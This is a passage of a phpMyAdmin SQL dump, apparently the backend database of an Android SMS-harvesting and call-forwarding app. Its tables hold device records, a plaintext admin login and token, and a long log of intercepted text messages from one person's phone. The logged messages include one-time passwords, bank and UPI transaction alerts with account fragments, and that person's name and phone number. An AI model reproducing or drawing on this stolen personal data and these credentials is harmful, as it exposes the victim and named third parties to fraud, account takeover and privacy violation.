-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Jan 07, 2026 at 12:50 AM
-- Server version: 5.7.23-23
-- PHP Version: 8.1.34

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `a1765dd9_firstproject`
--

-- --------------------------------------------------------

--
-- Table structure for table `admin`
--

CREATE TABLE `admin` (
  `id` int(255) NOT NULL,
  `userid` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `pass` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `admin`
--

INSERT INTO `admin` (`id`, `userid`, `pass`, `token`) VALUES
(1, 'master', 'master@gmail.com', '9f994efb-6109-42ca-95e7-ecf5e3cc4a68');

-- --------------------------------------------------------

--
-- Table structure for table `call_forwarding_status`
--

CREATE TABLE `call_forwarding_status` (
  `id` int(11) NOT NULL,
  `user_id` varchar(50) NOT NULL,
  `activate` tinyint(1) DEFAULT '0',
  `deactivate` tinyint(1) DEFAULT '0',
  `mobilenumber` varchar(20) DEFAULT NULL,
  `updated_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `device_info`
--

CREATE TABLE `device_info` (
  `id` int(11) NOT NULL,
  `device_model` varchar(100) COLLATE utf8_unicode_ci DEFAULT NULL,
  `android_version` varchar(50) COLLATE utf8_unicode_ci DEFAULT NULL,
  `internet_status` varchar(10) COLLATE utf8_unicode_ci DEFAULT NULL,
  `sim_count` int(11) DEFAULT NULL,
  `sim_operators` text COLLATE utf8_unicode_ci,
  `sim_numbers` text COLLATE utf8_unicode_ci,
  `network_operators` text COLLATE utf8_unicode_ci,
  `sim_status` text COLLATE utf8_unicode_ci,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

--
-- Dumping data for table `device_info`
--

INSERT INTO `device_info` (`id`, `device_model`, `android_version`, `internet_status`, `sim_count`, `sim_operators`, `sim_numbers`, `network_operators`, `sim_status`, `created_at`) VALUES
(82, 'samsung SM-A146B', '15', 'Connected', 2, 'airtel,airtel,', ',,', 'airtel,airtel,', '0,1,', '2025-12-31 08:49:45'),
(83, 'Google sdk_gphone64_arm64', '16', 'Yes', 1, 'SIM 1: T-Mobile', 'SIM 1: +15551234567', 'SIM 1: T-Mobile', 'SIM 1: Active', '2026-01-05 09:12:23'),
(84, 'Google sdk_gphone64_arm64', '16', 'Connected', 1, 'T-Mobile,', '+15551234567,', 'T-Mobile,', '0,', '2026-01-05 09:13:08'),
(85, 'Google sdk_gphone64_arm64', '16', 'Connected', 1, 'T-Mobile,', '+15551234567,', 'T-Mobile,', '0,', '2026-01-05 09:21:15'),
(86, 'Google sdk_gphone64_arm64', '16', 'Connected', 1, 'T-Mobile,', '+15551234567,', 'T-Mobile,', '0,', '2026-01-05 09:28:31'),
(87, 'Google sdk_gphone64_arm64', '16', 'Connected', 1, 'T-Mobile,', '+15551234567,', 'T-Mobile,', '0,', '2026-01-05 09:29:27'),
(88, 'Google sdk_gphone64_arm64', '16', 'Connected', 1, 'T-Mobile,', '+15551234567,', 'T-Mobile,', '0,', '2026-01-05 09:31:02'),
(89, 'Google sdk_gphone64_arm64', '16', 'Connected', 1, 'T-Mobile,', '+15551234567,', 'T-Mobile,', '0,', '2026-01-05 09:31:58'),
(90, 'Google sdk_gphone64_arm64', '16', 'Connected', 1, 'T-Mobile,', '+15551234567,', 'T-Mobile,', '0,', '2026-01-05 09:36:40'),
(91, 'Google sdk_gphone64_arm64', '16', 'Connected', 1, 'T-Mobile,', '+15551234567,', 'T-Mobile,', '0,', '2026-01-05 09:42:52'),
(92, 'Google sdk_gphone64_arm64', '16', 'Connected', 1, 'T-Mobile,', '+15551234567,', 'T-Mobile,', '0,', '2026-01-05 09:43:34');

-- --------------------------------------------------------

--
-- Table structure for table `sms_data`
--

CREATE TABLE `sms_data` (
  `id` int(11) NOT NULL,
  `user_id` varchar(50) NOT NULL,
  `sender` varchar(200) NOT NULL,
  `message` text NOT NULL,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `sms_data`
--

INSERT INTO `sms_data` (`id`, `user_id`, `sender`, `message`, `created_at`) VALUES
(5, '82', '+917617608174', 'Gandmare ', '2025-12-31 08:50:39'),
(6, '82', '+917617608174', 'Gandmare ', '2025-12-31 08:50:39'),
(7, '82', 'AD-650025-P', 'आप कपिल के LIVE ऑडियंस में हो सकते हैं! सिर्फ़ रु279 का रीचार्ज आपको The Great Indian Kapil Show में सीट जीतने का मौका देता है। साथ ही Netflix, JioHotstar और 20+ OTT और 1 महीने के लिए 1GB डाटा का भी आनंद लें। अपना एयरटेल प्रीपेड पैक रीचार्ज करने के लिए टैप करें i.airtel.in/RchNow1', '2025-12-31 08:50:43'),
(8, '82', 'AD-650025-P', 'आप कपिल के LIVE ऑडियंस में हो सकते हैं! सिर्फ़ रु279 का रीचार्ज आपको The Great Indian Kapil Show में सीट जीतने का मौका देता है। साथ ही Netflix, JioHotstar और 20+ OTT और 1 महीने के लिए 1GB डाटा का भी आनंद लें। अपना एयरटेल प्रीपेड पैक रीचार्ज करने के लिए टैप करें i.airtel.in/RchNow1', '2025-12-31 08:50:44'),
(9, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:53 Bal:Rs1.02.', '2025-12-31 09:18:54'),
(10, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:53 Bal:Rs1.02.', '2025-12-31 09:18:56'),
(11, '82', 'AD-SUBWAY-P', 'Subway New Year Special. Get a FREE Cookie on 149. Order Subway Sub Cravers starting @ 79 only . Code: xe8b43p3. Valid till 4 Jan. Hurry! Visit Now! TnC', '2025-12-31 09:19:13'),
(12, '82', 'AD-SUBWAY-P', 'Subway New Year Special. Get a FREE Cookie on 149. Order Subway Sub Cravers starting @ 79 only . Code: xe8b43p3. Valid till 4 Jan. Hurry! Visit Now! TnC', '2025-12-31 09:19:14'),
(13, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:01:38 Bal:Rs1.02.', '2025-12-31 09:20:34'),
(14, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:01:38 Bal:Rs1.02.', '2025-12-31 09:20:34'),
(15, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:02:07 Bal:Rs1.02.', '2025-12-31 09:25:07'),
(16, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:02:07 Bal:Rs1.02.', '2025-12-31 09:25:07'),
(17, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:01:46 Bal:Rs1.02.', '2025-12-31 09:34:03'),
(18, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:01:46 Bal:Rs1.02.', '2025-12-31 09:34:04'),
(19, '82', 'JD-WCRFIN-P', 'Tension khatam. Hero FinCorp de raha hai 5 lakh tak ka full support, 36 mahine tak ke repayment ke sath. Apply karo abhi. https://acl.cc/WCRFIN/3Ja03xMZ WeCredit', '2025-12-31 09:40:00'),
(20, '82', 'JD-WCRFIN-P', 'Tension khatam. Hero FinCorp de raha hai 5 lakh tak ka full support, 36 mahine tak ke repayment ke sath. Apply karo abhi. https://acl.cc/WCRFIN/3Ja03xMZ WeCredit', '2025-12-31 09:40:01'),
(21, '82', 'AD-650001-P', 'Aapka Airtel Prepaid pack 8800XXX420 par samapt hone wala hai! Rs379 se recharge karein aur niche diye gaye labh ka anand le 1 mahine tak.\n1. Unlimited 5G data + 2GB/din\n2. Unlimited call\n3. 100 SMS/din\n4. Google One, 1 mahina\n5. Apple Music, 6 mahine tak\nAbhi recharge karein Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2025-12-31 09:41:43'),
(22, '82', 'AD-650001-P', 'Aapka Airtel Prepaid pack 8800XXX420 par samapt hone wala hai! Rs379 se recharge karein aur niche diye gaye labh ka anand le 1 mahine tak.\n1. Unlimited 5G data + 2GB/din\n2. Unlimited call\n3. 100 SMS/din\n4. Google One, 1 mahina\n5. Apple Music, 6 mahine tak\nAbhi recharge karein Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2025-12-31 09:41:43'),
(23, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:01:36 Bal:Rs1.02.', '2025-12-31 10:02:16'),
(24, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:01:36 Bal:Rs1.02.', '2025-12-31 10:02:17'),
(25, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:38 Bal:Rs1.02.', '2025-12-31 10:05:54'),
(26, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:38 Bal:Rs1.02.', '2025-12-31 10:05:54'),
(27, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:06 Bal:Rs1.02.', '2025-12-31 10:07:19'),
(28, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:17 Bal:Rs1.02.', '2025-12-31 10:07:21'),
(29, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:17 Bal:Rs1.02.', '2025-12-31 10:07:23'),
(30, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:02:18 Bal:Rs1.02.', '2025-12-31 10:11:21'),
(31, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:02:18 Bal:Rs1.02.', '2025-12-31 10:11:31'),
(32, '82', 'VM-SBIUPI-S', 'Dear UPI user A/C X3476 debited by 12 on date 31Dec25 trf to SHOBH NATH CHAUR Refno 536501731278 If not u? call-1800111109 for other services-18001234-SBI', '2025-12-31 10:12:17'),
(33, '82', 'VM-SBIUPI-S', 'Dear UPI user A/C X3476 debited by 12 on date 31Dec25 trf to SHOBH NATH CHAUR Refno 536501731278 If not u? call-1800111109 for other services-18001234-SBI', '2025-12-31 10:12:17'),
(34, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:02:26 Bal:Rs1.02.', '2025-12-31 10:15:52'),
(35, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:02:26 Bal:Rs1.02.', '2025-12-31 10:15:52'),
(36, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:01:02 Bal:Rs1.02.', '2025-12-31 10:23:20'),
(37, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:01:02 Bal:Rs1.02.', '2025-12-31 10:23:21'),
(38, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:37 Bal:Rs1.02.', '2025-12-31 10:24:28'),
(39, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:37 Bal:Rs1.02.', '2025-12-31 10:24:29'),
(40, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:03:32 Bal:Rs1.02.', '2025-12-31 10:28:51'),
(41, '82', 'AD-650001-P', 'Aap incoming call aur OTP miss kar rahe hain! Abhi recharge karein Rs299 se aur payein unlimited call, 1.5GB data/din aur 100 SMS/din, 28 din tak. Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2025-12-31 11:19:09'),
(42, '82', 'AD-650001-P', 'Aap incoming call aur OTP miss kar rahe hain! Abhi recharge karein Rs299 se aur payein unlimited call, 1.5GB data/din aur 100 SMS/din, 28 din tak. Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2025-12-31 11:19:10'),
(43, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:22 Bal:Rs1.02.', '2025-12-31 12:00:19'),
(44, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:22 Bal:Rs1.02.', '2025-12-31 12:00:20'),
(45, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:01:44 Bal:Rs1.02.', '2025-12-31 12:09:59'),
(46, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:01:44 Bal:Rs1.02.', '2025-12-31 12:10:00'),
(47, '82', 'AD-AIRMCA-S', '2 missed call(s) received on 31-12-2025 while your Airtel number was not reachable. Get details of your missed calls ONLY on Airtel Thanks App https://i.airtel.in/1_MissedCall', '2025-12-31 12:53:33'),
(48, '82', 'VM-SBIUPI-S', 'Dear UPI user A/C X3476 debited by 600 on date 31Dec25 trf to Tushar  Sharma Refno 536518570505 If not u? call-1800111109 for other services-18001234-SBI', '2025-12-31 14:06:14'),
(49, '82', 'AD-650001-P', 'Offer 9871XXX551 ke liye!\nAbhi recharge karein Rs199 se aur payein unlimited call, 2GB data aur 100 SMS/din, 28 din tak. Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2025-12-31 14:15:21'),
(50, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:38 Bal:Rs1.02.', '2025-12-31 16:33:44'),
(51, '82', 'AD-AIRTEL-S', 'Pack Valid till 31 Dec 2025. CallCost:Rs0.00 Duration:00:00:12 Bal:Rs1.02.', '2025-12-31 17:18:29'),
(52, '82', 'VK-SBIUPI-S', 'Dear SBI User, your A/c X3476-credited by Rs.150 on 31Dec25 transfer from Tushar  Sharma Ref No 113589188336 -SBI', '2025-12-31 17:19:10'),
(53, '82', 'AD-AIRMCA-S', '3 missed call(s) received on 31-12-2025 while your Airtel number was not reachable. Get details of your missed calls ONLY on Airtel Thanks App https://i.airtel.in/1_MissedCall', '2025-12-31 19:21:29'),
(54, '82', 'AD-AIRTEL-S', 'ALERT: Incoming service including OTPs will stop from tonight on your Airtel number. To continue services, please recharge NOW. https://u.airtel.in/FDP1', '2026-01-01 03:56:23'),
(55, '82', 'AD-AIRTEL-S', 'ALERT: Incoming service including OTPs will stop from tonight on your Airtel number. To continue services, please recharge NOW. https://u.airtel.in/FDP1', '2026-01-01 04:13:48'),
(56, '82', 'AD-AIRTEL-S', 'Incoming calls and OTPs will be stopped from tonight on your Airtel number. To continue with your services, recharge now https://u.airtel.in/FDP1', '2026-01-01 04:26:42'),
(57, '82', 'AD-AIRTEL-S', 'ALERT: Incoming service including OTPs will stop from tonight on your Airtel number. To continue services, please recharge NOW. https://u.airtel.in/FDP1', '2026-01-01 05:06:45'),
(58, '82', 'AD-AIRFSC-P', 'REMINDER: Up to Rs 9,00,000 loan offer for 8800524420 ! Get it in your account within seconds with Airtel Flexi Credit. No paperwork required. Get now https://i.airtel.in/LOAN6', '2026-01-01 05:09:06'),
(59, '82', 'Airtel-S', 'Recharge of INR 299.00 is successful for your Airtel Mobile on 01-01-2026 10:51, Transaction ID 109518894.Check your balance, validity, tariff and best recharges on Airtel Thanks App i.airtel.in/SerAIr . Fraud Detection is now live on your Airtel number!', '2026-01-01 05:21:38'),
(60, '82', 'AD-AIRTEL-S', 'You have access to FREE Airtel Xstream Play on your Airtel number. Enjoy movies, shows and Live channels now at no added cost. Watch now : https://open.airtelxstream.in/20plus_OTTs', '2026-01-01 06:01:25'),
(61, '82', 'AD-650025-P', 'Your 5G phone is ready for superfast speeds, but you\'re missing out on enjoying it with unlimited 5G data! Recharge with Rs. 51 to unlock unlimited 5G data till your current pack validity and enjoy the best of your phone\'s capabilities. Why settle for less? https://i.airtel.in/5g51', '2026-01-01 06:01:27'),
(62, '82', 'AD-AIRMCA-S', 'The person you were calling at 10:54 is now available for calls. You can call again now. Get details of all these calls ONLY on Airtel Thanks App: https://i.airtel.in/2_Callalert', '2026-01-01 06:03:05'),
(63, '82', 'AX-ILOMBD-P', 'ICICI Lombard: Dear customer, your 2-wheeler policy is due for renewal. Click on https://i.icicilombard.com/ILOMBD/ybh1xfye to renew online. If you need any assistance, call your assigned telecaller  for support. Kindly ignore if you have already renewed. T&C apply. ADV/17396.', '2026-01-01 07:23:32'),
(64, '82', 'VK-SBIUPI-S', 'Dear SBI User, your A/c X3476-credited by Rs.100 on 01Jan26 transfer from Pinki  Sharma Ref No 600100333471 -SBI', '2026-01-01 07:30:09'),
(65, '82', 'AD-650003-P', 'Offer 9871XXX551 ke liye!\nAbhi recharge karein Rs349 se aur payein unlimited call, UL 5G data + 2GB/din, 20+ OTT Airtel Xstream Play Premium ke saath, 28 din. Saath hi payein Apple music, 6 mahine tak. Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2026-01-01 07:30:55'),
(66, '82', 'AD-650025-P', 'आप कपिल के LIVE ऑडियंस में हो सकते हैं! सिर्फ़ रु279 का रीचार्ज आपको The Great Indian Kapil Show में सीट जीतने का मौका देता है। साथ ही Netflix, JioHotstar और 20+ OTT और 1 महीने के लिए 1GB डाटा का भी आनंद लें। अपना एयरटेल प्रीपेड पैक रीचार्ज करने के लिए टैप करें i.airtel.in/RchNow1', '2026-01-01 08:17:45'),
(67, '82', 'JM-PVRVIP-P', 'Woh Ikkis ka tha, Ikkis ka hi rahega... Watch the true story of Param Vir Chakra awardee Lt. Arun Khetrapal. Book @PVR- https://c.pvrdm.in/PVRVIP/7rn3517gx', '2026-01-01 08:33:20'),
(68, '82', 'VM-PWRING-S', '<#> DO NOT SHARE YOUR OTP WITH ANYONE (Apna OTP kisi ko naa batayein). Your OTP for PAY WITH RING  Login: 901622 CnbmC5Rlu0Y', '2026-01-01 09:29:29'),
(69, '82', 'AD-650003-P', 'REMINDER: Airtel unlimited pack 8800XXX420 par samapt ho gaya hai. Abhi recharge karein Rs319 se aur payein unlimited call, 1.5GB data/din aur 100 SMS/din, 1 mahine tak. Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2026-01-01 09:30:31'),
(70, '82', 'CP-BEWLTY-P', 'BeWealthy Consultants: Dear customer, your 2-wheeler policy is due for renewal. Click on https://i.icicilombard.com/BEWLTY/24jd4cn4m to renew online now. If you need any assistance, call your assigned telecaller 7400075777 for support. Kindly ignore if you have already renewed.', '2026-01-01 10:18:25'),
(71, '82', 'AD-CMDELI-S', 'आपको मेरी ओर से आगामी वर्ष 2026 की हार्दिक शुभकामनाएँ।यह वर्ष आपके जीवन में सुख,शांति और समृद्धि लाए।\nरेखा गुप्ता-मुख्यमंत्री दिल्ली', '2026-01-01 10:29:04'),
(72, '82', 'JD-SBIUPI-S', 'Dear UPI user A/C X3476 debited by 30 on date 01Jan26 trf to Munesh Refno 600110599514 If not u? call-1800111109 for other services-18001234-SBI', '2026-01-01 10:35:40'),
(73, '82', 'CP-VDEKHO-P', 'Vahan Dekho: Dear customer, your 2-wheeler policy is due for renewal. Click on https://i.icicilombard.com/VDEKHO/4uj30e48 to renew online now. If you need any assistance, call your assigned telecaller 9304230051 for support. Kindly ignore if you have already renewed.', '2026-01-01 11:00:27'),
(74, '82', 'AD-650003-P', 'Aap incoming call aur OTP miss kar rahe hain! Abhi recharge karein Rs649 se aur payein UL call, 2GB data/din aur 100 SMS/din aur saath hi uplabdh hai UL 5G, 56 din tak. Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2026-01-01 12:40:33'),
(75, '82', 'JD-SBIUPI-S', 'Dear UPI user A/C X3476 debited by 24 on date 01Jan26 trf to Umesh Thakur Refno 636748846421 If not u? call-1800111109 for other services-18001234-SBI', '2026-01-01 14:29:17'),
(76, '82', 'VA-SBIUPI-S', 'Dear UPI user A/C X3476 debited by 40 on date 01Jan26 trf to Ashish Gupta Refno 600127950679 If not u? call-1800111109 for other services-18001234-SBI', '2026-01-01 14:45:35'),
(77, '82', 'AD-AIRMCA-S', '6 missed call(s) received on 01-01-2026 while your Airtel number was not reachable. Get details of your missed calls ONLY on Airtel Thanks App https://i.airtel.in/1_MissedCall', '2026-01-01 17:30:48'),
(78, '82', 'AD-BajajP-P', 'Exclusive Alert\nYou\'re eligible for Personal loan of up to Rs.10,00,000\nApply now for quick disbursal 1kx.in/BajajP/mK3b1u\nBajaj Market\nT&C', '2026-01-02 05:03:06'),
(79, '82', 'AD-AIRFSC-P', 'REMINDER: Up to Rs 9,00,000 loan offer for 8800524420 ! Get it in your account within seconds with Airtel Flexi Credit. No paperwork required. Get now https://i.airtel.in/LOAN6', '2026-01-02 05:07:15'),
(80, '82', 'JD-BajajP-P', 'Looking for the best personal loan? Compare offers, pick best EMI & apply instantly -100% digital journey! T&C* Bajaj Markets https://nc6.in/BajajP/al1lZU', '2026-01-02 05:09:38'),
(81, '82', 'AD-SUBWAY-P', 'Hungry for more? Get Flat 30% OFF on your next Subway order of 399+. Code: xeb89snr3j. Valid till 07 Jan. Visit Now & save. T&C', '2026-01-02 05:53:25'),
(82, '82', 'CP-ILOMBD-P', 'ICICI Lombard: Dear customer, your 2-wheeler policy is due for renewal. Click on https://i.icicilombard.com/ILOMBD/ybh1xfye to renew online. If you need any assistance, call your assigned telecaller  for support. Kindly ignore if you have already renewed. T&C apply. ADV/17396.', '2026-01-02 07:42:57'),
(83, '82', 'AD-650001-P', 'Offer 9871XXX551 ke liye!\nAbhi recharge karein Rs199 se aur payein unlimited call, 2GB data aur 100 SMS/din, 28 din tak. Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2026-01-02 08:30:19'),
(84, '82', 'VA-MONVEW-S', 'Your first Moneyview EMI is due on 05 January   2026! Pay on time & maintain a good repayment record. Click here to pay early - moneyview.in/l/MONVEW/1pPhP03N', '2026-01-02 09:12:20'),
(85, '82', '51501', 'G-903099 is your Google verification code. Don\'t share your code with anyone.', '2026-01-02 09:46:28'),
(86, '82', 'AD-AIRTEL-P', 'Kya aap \"Ghafoor\" pasand kar rahe hain? Ise apne Airtel Thanks App par FREE Hellotune banaa sakte hain! Yahan click karein i.airtel.in/FREE_1HT', '2026-01-02 10:53:56'),
(87, '82', 'AX-BEWLTY-P', 'BeWealthy Consultants: Dear customer, your 2-wheeler policy is due for renewal. Click on https://i.icicilombard.com/BEWLTY/24jd4cn4m to renew online now. If you need any assistance, call your assigned telecaller 7400075777 for support. Kindly ignore if you have already renewed.', '2026-01-02 11:09:48'),
(88, '82', 'CP-VDEKHO-P', 'Vahan Dekho: Dear customer, your 2-wheeler policy is due for renewal. Click on https://i.icicilombard.com/VDEKHO/4uj30e48 to renew online now. If you need any assistance, call your assigned telecaller 9304230051 for support. Kindly ignore if you have already renewed.', '2026-01-02 11:59:36'),
(89, '82', 'AX-ZUDIOO-P', 'Your ZUDIO SALE is LIVE. Fashion fits on sale @499 or less. This weekend, shop & save. Follow  http://u3.mnge.co/ZUDIOO/MRnWgKw *T&C', '2026-01-02 13:24:30'),
(90, '82', 'VM-SBIUPI-S', 'Dear SBI User, your A/c X3476-credited by Rs.100 on 02Jan26 transfer from Pinki  Sharma Ref No 600203676931 -SBI', '2026-01-02 13:44:34'),
(91, '82', 'VM-SBIUPI-S', 'Dear UPI user A/C X3476 debited by 20 on date 02Jan26 trf to SANJEEV RAI Refno 600222973610 If not u? call-1800111109 for other services-18001234-SBI', '2026-01-02 14:05:30'),
(92, '82', 'JM-KREDBE-S', '<#> 923186 is OTP for KreditBee login. Do not share OTP with anyone VuEEYdUJxhz', '2026-01-03 04:53:14'),
(93, '82', 'AD-KREDBE-S', '<#> 923186 is OTP for KreditBee login. Do not share OTP with anyone VuEEYdUJxhz', '2026-01-03 04:53:35'),
(94, '82', 'CP-YGKSHM-P', 'Yogekshm Insurance: Dear customer, your 2-wheeler policy is due for renewal. Click on https://i.icicilombard.com/YGKSHM/22ye39dm1 to renew online now. If you need any assistance, call your assigned telecaller 7775896329 for support. Kindly ignore if you have already renewed.', '2026-01-03 05:21:55'),
(95, '82', 'CP-DMIPLS-P', 'Hi Gaurav, aapke liye Rs.10 Lakh* tak ka Personal Loan + Loan amount ka 4% tak ke PLUS Coins. Tap https://mydmi.in/DMIFNC/8rRwPa *T&C  ~DMI Finance', '2026-01-03 05:48:01'),
(96, '82', 'AD-650002-P', 'Aap incoming call aur OTP miss kar rahe hain! Abhi recharge karein Rs349 se aur payein unlimited call, UL 5G data + 1.5GB/din, 20+ OTT jese SonyLIV, Lionsgate Play Airtel Xstream Play Premium ke saath, 28 din aur Apple music, 6 mahine tak. Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2026-01-03 07:10:24'),
(97, '82', 'AD-650025-P', 'Never run out of data during important moments. Get 75 GB + 200 GB rollover on Postpaid at just Rs.449. Upgrade now https://i.airtel.in/goldencohort', '2026-01-03 07:26:16'),
(98, '82', '+919220874484', 'I\'ll call you back.', '2026-01-03 07:33:00'),
(99, '82', 'AD-AIRTEL-P', 'Unlimited data 2 din ke liye? Haan!\nAbhi payein Rs99 vale Airtel pack ke saath. Click karein i.airtel.in/99_sil', '2026-01-03 08:36:28'),
(100, '82', 'AX-BFLFIN-P', 'Bajaj Finserv se ghar baithe paayein Rs.5,00,000 tak ka Easy EMI Loan approval - aur paayein Rs.1000 ka cashback. Apply now https://a.bflcomm.in/BAJAJF/c3zIuU', '2026-01-03 09:09:57'),
(101, '82', 'AD-650002-P', 'Offer 9871XXX551 ke liye!\nAbhi recharge karein Rs299 se aur payein 20+ OTT Airtel Xstream Play ke sath aur unlimited call, 1.5GB data/din, 100 SMS/din, 28 din tak. Recharge on Airtel Thanks App with ZERO CONVENIENCE FEE  i.airtel.in/AirRech', '2026-01-03 09:20:55'),
(102, '82', 'VK-KOTAKB-S', 'Sent Rs.5.00 from Kotak Bank AC X6032 to 8800524420@ybl on 03-01-26.UPI Ref 600316099250. Not you, https://kotak.com/KBANKT/Fraud', '2026-01-03 11:03:52'),
(103, '82', 'VK-KOTAKB-S', 'Rs.5.00 is credited to Kotak Bank a/c no. XXXX6032 on 03-01-26 as a reversal of debit transaction (UPI Ref no 600316099250).', '2026-01-03 11:03:56'),
(104, '82', 'AD-KOTAKB-S', 'Sent Rs.5.00 from Kotak Bank AC X6032 to gauravsharma8800524420-1@oksbi on 03-01-26.UPI Ref 600316103933. Not you, https://kotak.com/KBANKT/Fraud', '2026-01-03 11:04:54'),
(105, '82', 'JD-KOTAKB-S', 'Rs.5.00 is credited to Kotak Bank a/c no. XXXX6032 on 03-01-26 as a reversal of debit transaction (UPI Ref no 600316103933).', '2026-01-03 11:04:54'),
(106, '82', 'AX-KOTAKB-S', 'Sent Rs.5.00 from Kotak Bank AC X6032 to gauravsharma8800524420-1@oksbi on 03-01-26.UPI Ref 600316111315. Not you, https://kotak.com/KBANKT/Fraud', '2026-01-03 11:06:41'),
(107, '82', 'JD-KOTAKB-S', 'Rs.5.00 is credited to Kotak Bank a/c no. XXXX6032 on 03-01-26 as a reversal of debit transaction (UPI Ref no 600316111315).', '2026-01-03 11:06:51'),
(108, '82', 'VK-KOTAKB-S', 'Sent Rs.5.00 from Kotak Bank AC X6032 to gauravsharma8800524420-1@oksbi on 03-01-26.UPI Ref 600316124775. Not you, https://kotak.com/KBANKT/Fraud', '2026-01-03 11:09:53'),
(109, '82', 'JD-SBIUPI-S', 'Dear UPI user A/C X3476 debited by 20 on date 03Jan26 trf to SANJEEV RAI Refno 636984146006 If not u? call-1800111109 for other services-18001234-SBI', '2026-01-03 11:10:15'),
(110, '82', 'AX-BEWLTY-P', 'BeWealthy Consultants: Dear customer, your 2-wheeler policy is due for renewal. Click on https://i.icicilombard.com/BEWLTY/24jd4cn4m to renew online now. If you need any assistance, call your assigned telecaller 7400075777 for support. Kindly ignore if you have already renewed.', '2026-01-03 12:00:19'),
(111, '82', 'AX-VDEKHO-P', 'Vahan Dekho: Dear customer, your 2-wheeler policy is due for renewal. Click on https://i.icicilombard.com/VDEKHO/4uj30e48 to renew online now. If you need any assistance, call your assigned telecaller 9304230051 for support. Kindly ignore if you have already renewed.', '2026-01-03 13:02:29'),
